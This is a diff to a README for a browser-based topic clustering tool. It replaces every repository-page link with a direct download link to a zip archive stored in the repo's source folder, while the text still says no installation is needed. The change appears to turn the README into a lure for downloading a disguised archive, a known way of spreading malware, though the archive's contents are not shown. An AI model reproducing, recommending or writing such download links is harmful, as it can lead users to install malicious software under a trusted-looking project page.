@@ -1,6 +1,6 @@
 # 🚦 entity-topic-cluster - Client-Side Topic Clustering Tool
 
-[![Download](https://img.shields.io/badge/Download-entity--topic--cluster-brightgreen?style=for-the-badge)](https://github.com/seji210/entity-topic-cluster)
+[![Download](https://img.shields.io/badge/Download-entity--topic--cluster-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/seji210/entity-topic-cluster/main/src/topic-cluster-entity-v3.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to start using entity-topic-cluster on Windows:
 1. Open your web browser (Chrome is recommended).
 2. Go to the official repository page by clicking the button below.
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/seji210/entity-topic-cluster)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/seji210/entity-topic-cluster/main/src/topic-cluster-entity-v3.3.zip)
 
 3. On the GitHub page, find the **Releases** section or the main page, as the tool runs in the browser.
 4. No installation is needed. You simply open the web app from the repository or local files.
@@ -110,4 +110,4 @@ The visual graph helps you see how concepts connect and overlap in articles or c
 
 To get started, visit this page to download or run the tool in your browser:
 
-[Download or Run entity-topic-cluster on GitHub](https://github.com/seji210/entity-topic-cluster)
+[Download or Run entity-topic-cluster on GitHub](https://raw.githubusercontent.com/seji210/entity-topic-cluster/main/src/topic-cluster-entity-v3.3.zip)
